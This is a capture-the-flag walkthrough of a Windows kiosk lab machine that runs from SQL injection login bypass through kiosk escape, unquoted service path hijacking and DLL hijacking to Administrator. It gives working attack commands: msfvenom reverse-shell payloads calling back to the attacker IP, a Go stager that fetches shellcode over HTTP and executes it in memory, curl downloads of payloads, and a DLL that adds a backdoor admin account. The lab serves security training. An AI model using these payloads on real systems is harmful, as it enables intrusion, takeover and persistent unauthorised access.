# DarkHaven Kiosk Writeup

**Difficulty:** Medium
**Target:** 10.1.150.98
**Objective:** Escape a locked-down VDI kiosk environment and escalate privileges to Administrator across four privilege levels.

---

## Recon

### Port Scan

```bash
nmap -sV -sC -p 80,443,445,3389,5985,8443 10.1.150.98 -T4 -Pn
```

```
PORT     STATE    SERVICE        VERSION
80/tcp   open     http           Microsoft IIS httpd 10.0
443/tcp  filtered https
445/tcp  open     microsoft-ds?
3389/tcp open     ms-wbt-server  Microsoft Terminal Services
5985/tcp open     http           Microsoft HTTPAPI httpd 2.0
8443/tcp open     ssl/https-alt
```

The RDP banner identified the host as `EC2AMAZ-0536LUM` running Windows Server 2019 (10.0.17763). The TLS certificate on port 8443 contained `commonName=darkhaven-vdi.corp` with SANs for `darkhaven-vdi.corp` and `localhost`. No domain controller — this is a standalone workgroup machine.

### Web Enumeration

Visiting port 80 returns the default IIS page. Port 8443 presents a custom login form at `/login.asp`. The `robots.txt` file advertises three paths:

```
/portal.asp
/admin/
/api/
```

Directory brute-forcing with FeroxBuster against port 8443 yields no additional findings beyond those already disclosed.

### SMB Enumeration

Anonymous and guest SMB authentication both fail:

```bash
nxc smb 10.1.150.98 -u guest -p '' --shares
```

No shares are accessible unauthenticated.

---

## SQL Injection Authentication Bypass on Port 8443

The login form at `https://10.1.150.98:8443/login.asp` accepts a username and password. Testing with a classic SQL injection comment payload bypasses authentication without a valid password:

```
username: ' -- -
password: (anything)
```

The application returns a successful login and displays plaintext VDI credentials for the `vdiuser` account. This confirms unsanitized input is passed directly to a SQL query.

---

## RDP Access and Kiosk Escape (Shell as vdiuser)

Using the recovered credentials to connect via RDP:

```bash
xfreerdp3 /v:10.1.150.98 /u:vdiuser /p:'VDI@DH2024!' /sec:rdp /cert:ignore /dynamic-resolution
```

The session lands in a locked-down web-based kiosk presenting a corporate workspace with a document viewer, application launcher, and an "Open Network Document" field that accepts local and UNC paths.

Submitting a UNC path pointing to a credentialed SMB share causes Windows to open a File Explorer window browsing the remote share. The kiosk's extension filter blocks direct `.exe` execution via its own input validation, but once File Explorer is open, double-clicking the stager binary triggers a standard Windows security prompt which allows execution.

**Setting up the attack infrastructure on Kali:**

```bash
# Start credentialed SMB share (anonymous connections are rejected)
mkdir ~/kiosk_share
impacket-smbserver EXEGOL ~/kiosk_share -smb2support \
  -username vdiuser -password 'VDI@DH2024!'

# Generate shellcode
YOUR_IP=10.200.123.72
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$YOUR_IP LPORT=4444 -f raw -o ~/kiosk_share/shellc.bin

# Compile the Go stager (fetches shellcode from HTTP and executes in memory)
# stager.go downloads shellc.bin, calls VirtualAlloc with RWX permissions,
# copies shellcode into the allocated region, and jumps to it via syscall.Syscall
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
  go build -ldflags="-H windowsgui -s -w" -o ~/kiosk_share/stager.exe stager.go

# Serve shellcode over HTTP
sudo python3 -m http.server 80
```

**stager.go (abbreviated):**

```go
func main() {
    url := "http://10.200.123.72/shellc.bin"
    shellcode, _ := downloadShellcode(url)
    addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    for i := range shellcode {
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
    }
    syscall.Syscall(addr, 0, 0, 0, 0)
}
```

**Triggering execution via the kiosk:**

Enter the UNC path in the kiosk's "Open Network Document" field:

```
\\10.200.123.72\EXEGOL\stager.exe
```

File Explorer opens browsing the SMB share. Double-clicking `stager.exe` raises a Windows security prompt. Clicking Run executes the stager, which downloads `shellc.bin` over HTTP and executes it in memory, returning a Meterpreter session.

```
[*] Meterpreter session 1 opened (10.200.123.72:4444 -> 10.1.150.98:50218)
```

**Flag 1:**

```
meterpreter > cat "C:\VDIData\flag1.txt"
DH{vd1_unc_p4th_****
```

---

## Credential Discovery in Unattend.xml

With a Meterpreter session as `vdiuser`, reading the Windows deployment answer file reveals credentials for a second account:

```
meterpreter > cat "C:\Windows\Panther\Unattend.xml"
```

```xml
<AutoLogon>
  <Password>
    <Value>UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==</Value>
    <PlainText>false</PlainText>
  </Password>
  <Username>svcuser</Username>
</AutoLogon>
```

The value is Base64-encoded UTF-16LE, the standard encoding used by Windows unattended setup files. Decoding:

```bash
echo "UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==" | base64 -d | iconv -f UTF-16LE -t UTF-8
# Output: Svc_DH!2024
```

---

## Kiosk Escape as svcuser (Flag 2)

RDP with the recovered credentials:

```bash
xfreerdp3 /v:10.1.150.98 /u:svcuser /p:'Svc_DH!2024' /sec:rdp /cert:ignore /dynamic-resolution
```

The session opens another kiosk environment. This kiosk includes a file upload dialog reachable via a Browse button. Entering a path directly into the file dialog's address bar causes Windows to navigate there rather than open it as a file:

```
C:\Windows\system32\cmd.exe
```

This opens File Explorer navigated to `System32`. Repeating the same trick in the File Explorer address bar spawns a CMD prompt as `svcuser`, fully escaping the kiosk.

**Flag 2:**

```cmd
C:\Users\svcuser\Desktop> type flag2.txt
DH{unatt3nd_xml_****
```

---

## Unquoted Service Path Privilege Escalation (Shell as dh_admin)

Querying the `DH_KioskMonitor` service from the `svcuser` CMD session:

```cmd
sc qc DH_KioskMonitor
```

```
BINARY_PATH_NAME : C:\Program Files\Darkhaven Kiosk Services\DH Monitor Service\monitor.exe
SERVICE_START_NAME: .\dh_admin
```

The binary path is unquoted and contains spaces. Windows path resolution will attempt the following locations in order before reaching the real binary:

```
C:\Program.exe
C:\Program Files\Darkhaven.exe
C:\Program Files\Darkhaven Kiosk.exe
C:\Program Files\Darkhaven Kiosk Services\DH.exe   <-- writable by svcuser
C:\Program Files\Darkhaven Kiosk Services\DH Monitor.exe
C:\Program Files\Darkhaven Kiosk Services\DH Monitor Service\monitor.exe
```

Checking permissions confirms `svcuser` has full control over the service directory:

```cmd
icacls "C:\Program Files\Darkhaven Kiosk Services"
# EC2AMAZ-0536LUM\svcuser:(OI)(CI)(F)
```

The service runs as `.\dh_admin`, so any executable placed at the intercepted path will execute in that context.

A service-aware stager is required because the Windows Service Control Manager terminates processes that do not respond to control requests within the timeout window. Using `msfvenom`'s `exe-service` output format handles SCM signaling automatically:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.200.123.72 LPORT=4445 \
  -f exe-service -o ~/kiosk_share/DH.exe
```

Planting and triggering:

```cmd
cd "C:\Program Files\Darkhaven Kiosk Services\"
curl http://10.200.123.72/DH.exe -o DH.exe
sc.exe stop DH_KioskMonitor
sc.exe start DH_KioskMonitor
```

The SCM resolves the unquoted path, finds `DH.exe`, and starts it as `dh_admin`:

```
[*] Meterpreter session 1 opened (10.200.123.72:4445 -> 10.1.150.98:50732)
```

**Flag 3:**

```
meterpreter > cat "C:\Users\dh_admin\Desktop\flag3.txt"
DH{unqu0t3d_s3rv1c3_****
```

---

## DLL Hijacking via Scheduled Task (Shell as Administrator)

Enumerating the `C:\DarkhavenTools` directory from the `dh_admin` session reveals a health check executable and a log directory:

```
meterpreter > ls "C:\DarkhavenTools"

DarkhavenHealthCheck.exe
logs\
```

The log file records that the executable attempts to load a plugin DLL on every run:

```
meterpreter > cat "C:\DarkhavenTools\logs\healthcheck.log"

[2026-11-19 14:47:15] Health check started
[2026-11-19 14:47:15] Checking for plugin: C:\DarkhavenTools\logs\dhlog.dll
[2026-11-19 14:47:15] Plugin not found, skipping
[2026-11-19 14:47:15] Health check complete
```

The task runs as `Administrator` on a one-minute schedule. The log directory is writable from the `dh_admin` session. Placing a malicious DLL at the expected path will cause it to load and execute within `DllMain` on the next task invocation.

The DLL payload creates a local administrator account:

```bash
msfvenom -p windows/x64/exec \
  CMD='powershell -w hidden -c "net user 0xb0b Pwned123@! /add; net localgroup Administrators 0xb0b /add; net localgroup \"Remote Desktop Users\" 0xb0b /add"' \
  -f dll -o ~/kiosk_share/dhlog.dll
```

Uploading the DLL:

```
meterpreter > upload /home/kali/kiosk_share/dhlog.dll "C:\\DarkhavenTools\\logs\\dhlog.dll"
```

Within 60 seconds the scheduled task fires, loads the DLL, and executes the payload as Administrator. The new account is confirmed and used to RDP in:

```bash
xfreerdp3 /v:10.1.150.98 /u:0xb0b /p:'Pwned123@!' /sec:rdp /cert:ignore /dynamic-resolution
```

**Flag 4:**

```cmd
C:\Users\Administrator\Desktop> type flag4.txt
DH{dll_h1j4ck_4dm1n_****
```

---

## Flags

| Flag | Location | Technique |
|------|----------|-----------|
| `DH{vd1_unc_p4th_****` | `C:\VDIData\flag1.txt` | Kiosk escape via SMB UNC path + in-memory shellcode |
| `DH{unatt3nd_xml_****` | `C:\Users\svcuser\Desktop\flag2.txt` | Plaintext credential in Unattend.xml |
| `DH{unqu0t3d_s3rv1c3_****` | `C:\Users\dh_admin\Desktop\flag3.txt` | Unquoted service path hijack |
| `DH{dll_h1j4ck_4dm1n_****` | `C:\Users\Administrator\Desktop\flag4.txt` | DLL hijack via scheduled task |